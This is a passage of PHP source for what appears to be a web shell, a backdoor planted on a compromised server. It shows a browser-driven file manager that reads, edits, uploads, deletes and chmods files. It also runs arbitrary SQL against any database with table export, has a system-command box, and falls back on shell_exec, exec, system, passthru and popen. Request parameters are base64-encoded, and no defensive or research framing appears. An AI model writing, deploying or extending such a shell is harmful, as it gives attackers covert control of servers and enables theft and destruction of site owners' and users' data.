			$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $schematas = $pdo->query('SELECT schema_name FROM information_schema.schemata')->fetchAll();
            
            echo '<div class="db-container">';
            // Sidebar
            echo '<div class="db-sidebar">';
            echo '<h4>Databases</h4>';
            echo '<ul class="db-list">';
            foreach($schematas as $schema) {
                $schemaName = $schema['schema_name'];
                $activeClass = ($database == $schemaName) ? 'class="active"' : '';
                echo "<li {$activeClass}><a href=\"javascript:navigate('awal', 'skl', 'database', '{$schemaName}')\">{$schemaName}</a></li>";
            }
            echo '</ul>';
            if(!empty($database)) {
                $tablesStmt = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
                $tablesStmt->execute(array($database));
				$tables = $tablesStmt->fetchAll();
                echo '<h4 style="margin-top: 1.2rem;">Tables</h4>';
                echo '<ul class="db-list">';
                $currentTable = isset($_POST['t']) ? uraikan($_POST['t']) : '';
                foreach($tables as $table) {
                    $tableName = $table['table_name'];
                    $activeClass = ($currentTable == $tableName) ? 'class="active"' : '';
                    echo "<li {$activeClass}><a href=\"javascript:navigate('awal', 'skl', 'database', '{$database}', 't', '" . kunci($tableName) . "')\">" . htmlspecialchars($tableName) . "</a></li>";
                }
                echo '</ul>';
            }
            echo '</div>';
            // End Sidebar

            // Main Content
            echo '<div class="db-content">';
            if(empty($database)) {
                echo "Select a database from the sidebar to begin.";
            } else {
                if(isset($_POST['t']) && is_string($_POST['t']) && !empty($_POST['t'])) {
                    $tableName = uraikan($_POST['t']);
                    echo '<div class="db-table-info">';
                    echo '<span class="qalin">Table:</span> ' . htmlspecialchars($tableName) . ' ( <a href="javascript:navigate(\'awal\', \'skl_d_t\', \'t\', \'' . kunci($tableName) . '\')">Export Table</a> | <a href="javascript:navigate(\'awal\', \'skl_d\');">Export Database</a> )';
                    $dataCountQuery = $pdo->query('SELECT count(0) AS ss from `' . $tableName . '`');
                    $dataCount = (int)$dataCountQuery->fetchColumn();
                    echo '<br><span class="qalin">Rows:</span> ' . $dataCount;
                    echo '</div>';

                    $getColumns = $pdo->prepare("SELECT column_name from information_schema.columns where table_schema=? and table_name=?");
					$getColumns->execute(array($database, $tableName));
					$columns = $getColumns->fetchAll(PDO::FETCH_COLUMN);
                    if($columns) {
                        $pages = ceil($dataCount / 100);
                        $currentPage = isset($_POST['halaman']) && is_numeric($_POST['halaman']) && $_POST['halaman'] >= 1 && $_POST['halaman'] <= $pages ? (int)$_POST['halaman'] : 1;
                        $start = 100 * ($currentPage - 1);
						$dataQuery = $pdo->query('SELECT * FROM `' . $tableName . '` LIMIT ' . $start . ' , 100');
						$data = $dataQuery->fetchAll();

                        echo '<div class="data-table-container">';
                        echo '<table class="fManager data-table"><thead><tr>';
                        foreach($columns AS $columnName) {
                            echo '<th data-column-name="'.htmlspecialchars($columnName).'">' . htmlspecialchars($columnName) . '</th>';
                        }
                        echo '<th>Actions</th>';
                        echo '</tr></thead><tbody>';

                        foreach($data AS $row) {
                            $pkValue = htmlspecialchars(reset($row));
                            $pkValueEncoded = kunci($pkValue);
                            echo '<tr data-pk-val="'.$pkValue.'">';
                            foreach($row AS $val) {
                                echo '<td><div>' . htmlspecialchars($val) . '</div></td>';
                            }
                            echo '<td><a class="btn-modern" style="padding: 4px 8px; text-decoration: none;" href="javascript:navigate(\'awal\', \'edit_db_form\', \'t\', \''. $_POST['t'] .'\', \'pk_val\', \''. $pkValueEncoded .'\')">Edit</a></td>';
                            echo '</tr>';
                        }
                        echo '</tbody></table></div>';
                        if ($pages > 1) {
                            echo '<div class="pagination">';
                            for ($p = 1; $p <= $pages; $p++) {
                                $activeClass = ($currentPage == $p) ? 'active' : '';
                                echo '<a class="'.$activeClass.'" href="javascript:navigate(\'awal\', \'skl\', \'database\', \''.$database.'\', \'t\', \'' . kunci($tableName) . '\', \'halaman\', \'' . $p . '\');">' . $p . '</a> ';
                            }
                            echo '</div>';
                        }
                    } else {
                        echo "Table not found!";
                    }
                } else if(isset($_POST['emr']) && is_string($_POST['emr']) && !empty($_POST['emr'])) {
                    $emr = uraikan($_POST['emr']);
                    echo '<div class="db-table-info"><span class="qalin">SQL Query Result:</span><pre>' . htmlspecialchars($emr) . '</pre></div>';
					$dataQuery = $pdo->query($emr);
                    if ($dataQuery) {
                        $data = $dataQuery->fetchAll();
                        if (count($data) > 0) {
                             echo '<div class="data-table-container">';
                             echo '<table class="fManager data-table"><thead><tr>';
                            foreach($data[0] as $key => $val) {
                                echo '<th>' . htmlspecialchars($key) . '</div></th>';
                            }
                            echo '</tr></thead><tbody>';
                            foreach($data as $row) {
                                echo '<tr>';
                                foreach($row as $val) {
                                    echo '<td><div>' . htmlspecialchars($val) . '</div></td>';
                                }
                                echo '</tr>';
                            }
                            echo '</tbody></table></div>';
                        } else {
                           echo "Query executed successfully, but returned no results.";
                        }
                    } else {
                        echo "<span style='color: #ff5555;'>Error executing query: " . htmlspecialchars($pdo->errorInfo()[2]) . "</span>";
                    }
                } else {
                    echo "Select a table from the sidebar to view its content.";
                }

                // SQL Editor
                echo '<div class="sql-editor-container">';
                echo '<h4>SQL Query</h4>';
                echo '<textarea id="skl_emr" class="file_edit" style="height: 120px;"></textarea>';
                echo '<button type="button" class="btn-modern" style="margin-top:0.7rem;" onclick="skl_bas();">Execute Query</button>';
                echo '</div>';
            }
            echo '</div>';
            // End Content
            echo '</div>';
            // End Container
		}
		catch (Exception $e)
		{
			echo '<div style="color: #ff5555; padding: 0.7rem; border: 1px dotted #ff5555; border-radius: 5px;">Connection failed: ' . $e->getMessage() . '</div>';
		}
	}
}
else if($awal=="edit_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
{
	$namaBerkas = basename(uraikan($_POST['fayl']));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		$status = "";
		if(isset($_POST['content'], $_POST['took']) && $_POST['took'] != "" && isset($_SESSION['ys_took']) && $_SESSION['ys_took'] == $_POST['took'])
		{
			unset($_SESSION['ys_took']);
			$content = $_POST['content'];
            $targetFile = $default_dir . $pemisah . $namaBerkas;
            $save_success = false;
            $used_method = '';

            // 0. Coba ubah permission dulu agar writable
            @chmod($targetFile, 0644);

            // --- METODE 1: Standard PHP ---
            if (!$save_success && file_put_contents($targetFile, $content) !== false) {
                $save_success = true; $used_method = 'file_put_contents';
            }

            // --- METODE 2: Fopen/Fwrite (Stream) ---
            if (!$save_success) {
                $fp = @fopen($targetFile, 'w');
                if ($fp) {
                    if (@fwrite($fp, $content) !== false) {
                        $save_success = true; $used_method = 'fwrite';
                    }
                    @fclose($fp);
                }
            }

            // --- METODE 3: Tulis ke TMP lalu Pindah (Bypass Permission/Lock) ---
            if (!$save_success) {
                $tmp_file = tempnam(sys_get_temp_dir(), 'edit_');
                if (@file_put_contents($tmp_file, $content) !== false) {
                    // 3a. Rename/Move PHP
                    if (@rename($tmp_file, $targetFile)) {
                        $save_success = true; $used_method = 'rename_tmp';
                    }
                    // 3b. Copy PHP
                    elseif (@copy($tmp_file, $targetFile)) {
                        $save_success = true; $used_method = 'copy_tmp';
                    }
                    // 3c. System Command (cp/mv/cat)
                    else {
                        $cmd_run = function($c) {
                            if(function_exists('shell_exec')){ @shell_exec($c); return true; }
                            if(function_exists('exec')){ @exec($c); return true; }
                            if(function_exists('system')){ @system($c); return true; }
                            if(function_exists('passthru')){ @passthru($c); return true; }
                            if(function_exists('popen')){ $p=@popen($c,'r'); if($p){pclose($p);return true;} }
                            return false;
                        };
                        
                        $c_cp  = "cp " . escapeshellarg($tmp_file) . " " . escapeshellarg($targetFile);
                        $c_mv  = "mv " . escapeshellarg($tmp_file) . " " . escapeshellarg($targetFile);
                        $c_cat = "cat " . escapeshellarg($tmp_file) . " > " . escapeshellarg($targetFile);

                        if ($cmd_run($c_cp)) { $save_success = true; $used_method = 'exec_cp'; }
                        elseif ($cmd_run($c_mv)) { $save_success = true; $used_method = 'exec_mv'; }
                        elseif ($cmd_run($c_cat)) { $save_success = true; $used_method = 'exec_cat'; }
                    }
                    @unlink($tmp_file); // Hapus file sampah
                }
            }

            // --- VERIFIKASI ANTI-0KB ---
            // Jika konten asli tidak kosong, tapi hasil di server 0 byte, maka anggap gagal.
            clearstatcache();
            if ($save_success && strlen($content) > 0 && (!file_exists($targetFile) || filesize($targetFile) === 0)) {
                $save_success = false;
                $status = " <span class='qalin' style='color:#ff5555;'>Saved via {$used_method} but result is 0kb (Write Failed).</span>";
            } elseif ($save_success) {
                $status = " <span class='qalin' style='color:#00FF00;'>Saved successfully via <strong>{$used_method}</strong>!</span>";
            } else {
                $status = " <span class='qalin' style='color:#ff5555;'>Failed to save using all methods. Check Permission/Disk Space.</span>";
            }
		}
		$oxuUrl = "?awal=baca_file&fayl=" . kunci($namaBerkas) . "&berkas=" . kunci($default_dir);
		$elaveBtn = is_writeable($default_dir . $pemisah . $namaBerkas) ? "" : " disabled";
		?>
		<form method="POST" style="padding: 0; margin: 0;">
			<div class="file-info-container">
				<div>
					File Name: <span class="qalin"><?= htmlspecialchars($namaBerkas) ?></span>
					<?= $status ?>
				</div>
				<div>
					<input type="hidden" value="edit_file" name="awal">
					<input type="hidden" value="<?= kunci($namaBerkas) ?>" name="fayl">
					<input type="hidden" value="<?= kunci($default_dir) ?>" name="berkas">
					<input type="hidden" value="<?= ambilBuat("ys_took") ?>" name="took">
					<button type="submit" class="btn-modern"<?= $elaveBtn ?>>
						<i class="fas fa-save"></i> Save
					</button>
				</div>
			</div>
			<textarea name="content" class="file_edit" <?= is_writeable($default_dir . $pemisah . $namaBerkas) ? '' : 'disabled' ?>><?= htmlspecialchars(file_get_contents($default_dir . $pemisah . $namaBerkas)) ?></textarea>
		</form>
		<?php
	}
	else
	{
		print "Error! " . htmlspecialchars($default_dir . $pemisah . $namaBerkas);
	}
}
else
{
	if(is_dir($default_dir))
	{
		if(is_readable($default_dir))
		{
			$folderDalam = scandir($default_dir);
            $items = [];
			foreach($folderDalam as $element)
			{
				$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" ? "/" : "";
                $fileNamaLengkap = $default_dir . $pemisah . $element;
                $is_dir = is_dir($fileNamaLengkap);
                $items[] = [
                    'name' => $element,
                    'is_dir' => $is_dir,
                    'type_prefix' => $is_dir ? '0' : '1'
                ];
			}
			
            // Sort folders first, then files
            usort($items, function($a, $b){
                if ($a['name'] === '.') return -1;
                if ($b['name'] === '.') return 1;
                if ($a['name'] === '..') return -1;
      
                   if ($b['name'] === '..') return 1;
                if ($a['is_dir'] && !$b['is_dir']) return -1;
                if (!$a['is_dir'] && $b['is_dir']) return 1;
                return strcasecmp($a['name'], $b['name']);
            });
            echo '<div class="fManager-wrapper">';
            echo "<table class='fManager'><thead><tr class='qalin'><th>File</th><th>Size</th><th>Date</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>";
			foreach($items AS $item)
			{
				$element = $item['name'];
                $pemisah = substr($default_dir, strlen($default_dir)-1) != "/" ? "/" : "";
                $fileNamaLengkap = $default_dir . $pemisah . $element;

                $isWriteable = is_writable($fileNamaLengkap);
                $permissionsColor = $isWriteable ? "#00FF00" : "#FF0000";
                $currentPerms = substr(sprintf('%o', @fileperms($fileNamaLengkap)), -4);

                print '<tr><td>';
                
                if($item['is_dir']) {
                    print '<i class="fas fa-folder" style="color:#FFD700; margin-right: 5px;"></i>';
                    $navPath = '';
                    if ($element == '..') {
                        $navPath = kunci(dirname($default_dir));
                    } else {
                        $navPath = kunci($fileNamaLengkap);
                    }
                    print '<a href="javascript:navigate(\'berkas\', \'' . $navPath . '\')" style="font-weight:600; color:#FFFFFF;">' . htmlspecialchars($element) . '</a>';
                } else {
                    print '<i class="fas fa-file" style="color:#FFFFFF; margin-right: 5px;"></i>';
                    print '<a href="javascript:navigate(\'awal\', \'baca_file\', \'fayl\', \'' . kunci($element) . '\', \'berkas\', \'' . kunci($default_dir) . '\')" style="color:#FFFFFF;">' . htmlspecialchars($element) . '</a>';
                }

                print '</td>
                        <td>' . sizeFormat(@filesize($fileNamaLengkap)) . '</td>
                        <td>' . (date('d M Y, H:i', @filemtime($fileNamaLengkap))) . '</td>
                        <td>';
                if(function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
                            $owner = @posix_getpwuid(@fileowner($fileNamaLengkap));
                            $group = @posix_getgrgid(@filegroup($fileNamaLengkap));
                            echo htmlspecialchars((isset($owner['name']) ? $owner['name'] : 'N/A')) . '/' . htmlspecialchars((isset($group['name']) ? $group['name'] : 'N/A'));
                } else {
                           echo 'N/A';
                }
                print '</td>
                        <td style="color:' . $permissionsColor . ';">
                            <a href="javascript:;" onclick="changePermissions(\'' . kunci($element) . '\', \'' . $currentPerms . '\')" style="color: inherit; text-decoration: none; cursor:pointer;">' . $currentPerms . '</a>
                        </td>
                        <td>';
                if(is_file($fileNamaLengkap))
                {
                    print (' <a href="javascript:navigate(\'awal\', \'download_file\', \'fayl\', \'' . kunci($element) . '\', \'berkas\', \'' . kunci($default_dir) . '\')"><i class="fas fa-download" style="color:#FFFFFF;"></i></a> | ')
                        . (' <a href="javascript:navigate(\'awal\', \'edit_file\', \'fayl\', \'' . kunci($element) . '\', \'berkas\', \'' . kunci($default_dir) . '\');"><i class="fas fa-pen" style="color:#FFFFFF;"></i></a> | ')
                        . (' <a href="javascript:changeFileName(\'' . htmlspecialchars($element) . '\', \'' . kunci($element) . '\');"><i class="fas fa-i-cursor" style="color:#FFFFFF;"></i></a> | ')
                        . (' <a href="javascript:deleteFile(\'' . kunci($element) . '\');"><i class="fas fa-trash-alt" style="color:#FFFFFF;"></i></a>');
                }
                else if($element != '.' && $element != '..')
                {
                    print (' <a href="javascript:compressFolder(\'' . kunci($fileNamaLengkap) . '\');"><i class="fas fa-file-archive" style="color:#FFFFFF;"></i></a> | ')
                        . (' <a href="javascript:deleteFolder(\'' . kunci($fileNamaLengkap) . '\');"><i class="fas fa-trash-alt" style="color:#FFFFFF;"></i></a>');
                }

                print '</td></tr>';
			}
            echo "</tbody></table></div>";
		}
		else
		{
            echo '<div class="fManager-wrapper"><table class="fManager"><tbody>';
            print "<tr><td colspan='6'><div style='margin: 1rem 0px;' class='qalin'>Permission denied!</div></td></tr>";
            echo "</tbody></table></div>";
		}
	}
}
?>
<hr style="border-color: #333; border-style: dotted;">

</div>


<script>
// ===========================================================================
// JavaScript functions for navigation and interaction, with prompts in English.
// ===========================================================================
function navigate() {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '';
    form.style.display = 'none';
    const params = {};
    for (let i = 0; i < arguments.length; i += 2) {
        params[arguments[i]] = arguments[i + 1];
    }

    if (!params.hasOwnProperty('awal') && params.hasOwnProperty('berkas')) {
        // This is a directory navigation, do not set default 'awal'
    } else if (!params.hasOwnProperty('awal')) {
        params['awal'] = 'dasar';
        // Default action
    }

    for (const key in params) {
        if (params.hasOwnProperty(key)) {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = key;
            input.value = params[key];
            form.appendChild(input);
        }
    }
    
    document.body.appendChild(form);
    form.submit();
}

function changeFileName(name, fayl)
{
	var getNewName = prompt('Change file name:', name);
	if(getNewName)
	{
		navigate('awal', 'rename_file', 'fayl', fayl, 'new_name', b64EncodeUnicode(getNewName), 'berkas', '<?= kunci($default_dir) ?>');
	}
}

function deleteFile(fayl)
{
    if(confirm('Are you sure you want to delete this file?')) {
        navigate('awal', 'hapus_file', 'fayl', fayl, 'berkas', '<?= kunci($default_dir) ?>');
    }
}

function compressFolder(zf) {
    var dir = prompt('Save compressed file to directory:', "<?=htmlspecialchars($default_dir)?>");
    if (dir) {
        navigate('awal', 'kompres', 'zf', zf, 'save_to', b64EncodeUnicode(dir), 'berkas', '<?= kunci($default_dir) ?>');
    }
}

function deleteFolder(zf) {
    if (confirm('Are you sure you want to delete this folder and all its contents?')) {
        navigate('awal', 'hapus_folder', 'zf', zf, 'berkas', '<?= kunci($default_dir) ?>');
    }
}

function changePermissions(fayl, current_perms) {
    var newPerms = prompt('Enter new permissions (e.g., 0755):', current_perms);
    if (newPerms && newPerms !== current_perms) {
        // Basic validation on client side
        if (/^[0-7]{3,4}$/.test(newPerms)) {
            navigate('awal', 'ubah_perm', 'fayl', fayl, 'perm', newPerms, 'berkas', '<?= kunci($default_dir) ?>');
        } else {
            alert('Invalid format. Please use a 3 or 4-digit octal number (e.g., 0755).');
        }
    }
}

function newFile()
{
    var formContainer = document.getElementById('newFileContainer');
    if (formContainer.style.display === 'none' || formContainer.style.display === '') {
        formContainer.style.display = 'block';
    } else {
        formContainer.style.display = 'none';
    }
}

function newPapka()
{
	var getNewName = prompt('New folder name:');
	if(getNewName)
	{
		navigate('awal', 'buat_folder', 'ad', b64EncodeUnicode(getNewName), 'berkas', '<?= kunci($default_dir) ?>');
	}
}

function sistemKom()
{
	var komanda = document.getElementById('emr_et_atash').value;
	if(komanda)
	{
		navigate('awal', 'sistem_kom', 'kom', b64EncodeUnicode(komanda), 'berkas', '<?= kunci($default_dir) ?>');
	}
}

function skl_bas()
{
	var sklEmr = document.getElementById('skl_emr').value;
	navigate('awal', 'skl', 'emr', b64EncodeUnicode(sklEmr), 'database', '<?= $database ?>');
}
function b64EncodeUnicode(str)
{
	return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
		function toSolidBytes(match, p1) {
			return String.fromCharCode('0x' + p1);
}));
}

function toggleUpload() {
    var uploadContainer = document.getElementById('uploadContainer');
    if (uploadContainer.style.display === 'none' || uploadContainer.style.display === '') {
        uploadContainer.style.display = 'block';
    } else {
        uploadContainer.style.display = 'none';
    }
}

function toggleFetcher() {
    var fetchContainer = document.getElementById('fetchContainer');
    if (fetchContainer.style.display === 'none' || fetchContainer.style.display === '') {
        fetchContainer.style.display = 'block';
    } else {
        fetchContainer.style.display = 'none';
    }
}

var commandInput = document.getElementById("emr_et_atash");
if(commandInput) {
    commandInput.addEventListener("keyup", function(event)
    {
        event.preventDefault();
        if(event.key === 'Enter')
        {
            sistemKom();
        }
    });
}
</script>
<script>
const uploadPanel = document.getElementById('upload-panel');
const realFileInput = document.getElementById('file-input-real');
const ajaxForm = document.getElementById('ajaxUploadForm');
const statusDiv = document.getElementById('uploadStatus');
const progressContainer = document.getElementById('progress-container');
const progressBar = document.getElementById('progress-bar');

if (uploadPanel) {
    // Trigger file input click when panel is clicked
    uploadPanel.addEventListener('click', () => {
        realFileInput.click();
    });
    // Handle file selection via browse
    realFileInput.addEventListener('change', () => {
        if (realFileInput.files.length > 0) {
            handleUpload(realFileInput.files[0]);
        }
    });
    // Drag and Drop events
    uploadPanel.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadPanel.classList.add('drag-over');
    });
    uploadPanel.addEventListener('dragleave', () => {
        uploadPanel.classList.remove('drag-over');
    });
    uploadPanel.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadPanel.classList.remove('drag-over');
        const files = e.dataTransfer.files;
        if (files.length > 0) {
            handleUpload(files[0]);
        }
    });
}


function handleUpload(file) {
    const formData = new FormData(ajaxForm);
    formData.set('ufile', file);
    // Make sure the file is correctly set
    
    const xhr = new XMLHttpRequest();
    xhr.open('POST', ajaxForm.action || window.location.href, true);

    // Progress event
    xhr.upload.addEventListener('progress', (e) => {
        if (e.lengthComputable) {
            const percentComplete = (e.loaded / e.total) * 100;
            progressContainer.style.display = 'block';
            progressBar.style.width = percentComplete + '%';
        }
    });
    xhr.onloadstart = function() {
        statusDiv.innerText = `Uploading ${file.name}...`;
        statusDiv.style.color = '#ddd';
        progressBar.style.width = '0%';
    };

    xhr.onload = function () {
        const res = xhr.responseText.trim();
        if (xhr.status === 200 && res.toLowerCase().includes("success")) {
            statusDiv.style.color = '#00FF00';
            statusDiv.innerText = 'Upload successful! Refreshing...';
            progressBar.style.width = '100%';
            setTimeout(() => {
                // Refresh the page to show the new file
                navigate('berkas', '<?= kunci($default_dir) ?>');
            }, 1500);
        } else {
            statusDiv.style.color = '#FF4444';
            statusDiv.innerText = 'Upload failed!';
            progressContainer.style.display = 'none';
        }
    };
    xhr.onerror = function () {
        statusDiv.style.color = '#FF4444';
        statusDiv.innerText = 'An error occurred during upload!';
        progressContainer.style.display = 'none';
    };

    xhr.send(formData);
}
</script>
</body>
</html>
